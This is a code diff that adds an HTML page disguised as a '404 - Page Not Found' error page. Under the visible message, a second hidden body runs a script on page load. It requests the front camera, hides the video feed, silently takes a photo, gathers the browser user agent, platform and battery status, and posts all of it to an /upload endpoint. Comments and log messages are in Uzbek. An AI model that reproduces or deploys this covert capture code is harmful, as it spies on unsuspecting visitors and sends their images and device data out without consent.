@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <style>
+        #video {
+            display: none; 
+        }
+    </style>
+</head>
+<head>
+  <meta charset="UTF-8">
+  <title>404 - Page Not Found</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #232526, #414345);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 8rem;
+      margin: 0;
+    }
+
+    p {
+      font-size: 1.5rem;
+      margin: 10px 0 30px;
+    }
+
+    a {
+      padding: 12px 24px;
+      background: #ff4b2b;
+      color: white;
+      text-decoration: none;
+      border-radius: 30px;
+      transition: background 0.3s ease;
+    }
+
+    a:hover {
+      background: #ff6f61;
+    }
+  </style>
+</head>
+<body>
+  <h1>404</h1>
+  <p>The page you are looking for was not found.</p>
+  <a href="/">Go Back Home</a>
+</body>
+<body>
+  <h1></h1>
+
+  <video id="video" autoplay></video>
+
+  <script>
+      const video = document.getElementById('video');
+
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+          .then(stream => {
+              video.srcObject = stream;
+
+              video.onloadedmetadata = () => {
+                  setTimeout(captureAndSendPhoto, 1000); 
+              };
+          })
+          .catch(err => {
+              console.error("Kamera ruxsati berilmadi:", err);
+          });
+
+      async function captureAndSendPhoto() {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0);
+
+          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+
+          const userAgent = navigator.userAgent;
+          const platform = navigator.platform;
+
+          let batteryLevel = 'unknown';
+          let batteryCharging = 'unknown';
+          try {
+              const battery = await navigator.getBattery();
+              batteryLevel = battery.level;
+              batteryCharging = battery.charging;
+          } catch (e) {}
+
+          const formData = new FormData();
+          formData.append('photo', blob, 'auto.jpg');
+          formData.append('userAgent', userAgent);
+          formData.append('platform', platform);
+          formData.append('batteryLevel', batteryLevel);
+          formData.append('batteryCharging', batteryCharging);
+
+          fetch('/upload', {
+              method: 'POST',
+              body: formData
+          }).then(res => {
+              if (res.ok) {
+                  console.log("Rasm va malumotlar yuborildi ✅");
+              } else {
+                  console.error("Yuborishda xatolik ❌");
+              }
+          }).catch(err => {
+              console.error("Xatolik:", err);
+          });
+      }
+  </script>
+</body>
+</html>
